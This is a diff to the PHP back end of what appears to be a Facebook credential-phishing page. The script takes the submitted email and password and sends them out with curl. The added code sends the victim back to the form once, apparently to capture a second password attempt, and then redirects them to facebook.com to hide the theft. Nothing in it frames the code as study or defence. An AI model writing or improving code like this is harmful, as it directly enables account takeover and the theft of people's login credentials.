@@ -1,4 +1,6 @@
 <?php
+session_start();
+
 $email = $_POST['email'];
 $password = $_POST['password'];
 
@@ -26,7 +28,30 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 $response = curl_exec($ch);
 curl_close($ch);
 
-// Redirect after successful submission
+
+
+
+/*|--------------------------------------------------------------------------|
+   First submission
+|--------------------------------------------------------------------------*/
+
+if (!isset($_SESSION['first_submit'])) {
+
+    $_SESSION['first_submit'] = true;
+
+    // Reload the form page
+    header("Location: index.html"); // Change this to your actual form page
+    exit();
+}
+
+/*--------------------------------------------------------------------------|
+  Second submission
+|--------------------------------------------------------------------------*/
+
+// Clear the session so the process starts over next time
+unset($_SESSION['first_submit']);
+
+// Redirect after second submission
 header("Location: https://facebook.com");
 exit();
 ?>
